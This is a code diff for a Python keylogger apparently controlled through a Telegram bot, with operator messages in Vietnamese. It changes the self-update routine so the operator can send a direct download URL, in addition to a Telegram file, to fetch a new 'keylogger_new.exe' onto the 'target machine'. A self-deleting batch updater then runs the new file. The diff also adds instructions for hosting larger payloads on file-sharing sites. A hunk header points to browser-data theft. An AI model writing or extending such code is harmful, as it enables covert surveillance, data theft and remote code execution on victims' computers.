@@ -741,25 +741,34 @@ def get_browser_data():
         send_telegram_message(f"❌ Lỗi lấy dữ liệu browser: {e}")
         return False
 
-def self_update(file_id):
+def self_update(file_id_or_url):
     try:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={file_id}"
-        resp_json = requests.get(url, timeout=15).json()
-        if not resp_json.get('ok'):
-            error_desc = resp_json.get('description', 'Unknown API Error')
-            send_telegram_message(f"❌ Lỗi lấy thông tin file từ Telegram: {error_desc}")
-            return
-            
-        file_path = resp_json.get('result', {}).get('file_path')
-        if not file_path:
-            send_telegram_message("❌ Lỗi: Không lấy được file_path từ phản hồi của Telegram.")
-            return
-
-        download_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
+        # Check if the input is a direct download URL instead of Telegram file_id
+        if file_id_or_url.startswith("http://") or file_id_or_url.startswith("https://"):
+            download_url = file_id_or_url
+        else:
+            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={file_id_or_url}"
+            resp_json = requests.get(url, timeout=15).json()
+            if not resp_json.get('ok'):
+                error_desc = resp_json.get('description', 'Unknown API Error')
+                send_telegram_message(f"❌ Lỗi lấy thông tin file từ Telegram: {error_desc}")
+                return
+                
+            file_path = resp_json.get('result', {}).get('file_path')
+            if not file_path:
+                send_telegram_message("❌ Lỗi: Không lấy được file_path từ phản hồi của Telegram.")
+                return
+            download_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
 
         new_exe = "keylogger_new.exe"
-        with open(new_exe, "wb") as f:
-            f.write(requests.get(download_url, timeout=30).content)
+        send_telegram_message("🔄 Đang tải file cập nhật xuống máy mục tiêu...")
+        
+        # Download file with stream to handle large files efficiently
+        with requests.get(download_url, stream=True, timeout=60) as r:
+            r.raise_for_status()
+            with open(new_exe, "wb") as f:
+                for chunk in r.iter_content(chunk_size=8192):
+                    f.write(chunk)
         
         updater = "updater.bat"
         current_exe = sys.executable
@@ -776,7 +785,7 @@ def self_update(file_id):
                 del "%~f0"
                 ''')
         
-        send_telegram_message("✅ Đã tải bản mới. Đang cập nhật...")
+        send_telegram_message("✅ Đã tải bản mới thành công. Đang khởi động lại tiến trình...")
         subprocess.Popen([updater], shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE)
         sys.exit(0)
     except Exception as e:
@@ -889,17 +898,23 @@ def execute_command(command, message=None):
             reply_markup=inline_kb
         )
 
-    elif cmd in ["/update", "update"]:
-        if message and "document" in message:
+    elif cmd.startswith("/update") or cmd.startswith("update"):
+        parts = command.strip().split()
+        if len(parts) == 2:
+            # Command syntax: /update <download_url>
+            target_url = parts[1].strip()
+            self_update(target_url)
+        elif message and "document" in message:
             if message["document"]["file_name"].endswith(".exe"):
                 send_telegram_message("🔄 Đang cập nhật .exe...")
                 self_update(message["document"]["file_id"])
         else:
             send_telegram_message(
-                f"<b>🔄 Hướng dẫn cập nhật .exe cho [{machine}]:</b>\n\n"
-                f"Vui lòng gửi file <code>.exe</code> mới trực tiếp vào cuộc trò chuyện này, "
-                f"và nhập phần chú thích (caption) đính kèm là:\n"
-                f"<code>/update @{my_name}</code>"
+                f"<b>🔄 Hướng dẫn cập nhật .exe (Hỗ trợ file > 20MB):</b>\n\n"
+                f"<b>Cách 1 (Dưới 20MB):</b> Gửi trực tiếp file <code>.exe</code> vào đây với chú thích:\n"
+                f"<code>/update @{my_name}</code>\n\n"
+                f"<b>Cách 2 (Trên 20MB - Lên đến 100MB):</b> Tải file <code>.exe</code> lên một trang lưu trữ (như Gofile, Mediafire, DropBox, hoặc GitHub) và lấy link tải trực tiếp (Direct Link), sau đó gửi lệnh:\n"
+                f"<code>/update &lt;link_tải_trực_tiếp&gt; @{my_name}</code>"
             )
 
     elif cmd.startswith("/interval") or cmd.startswith("interval"):
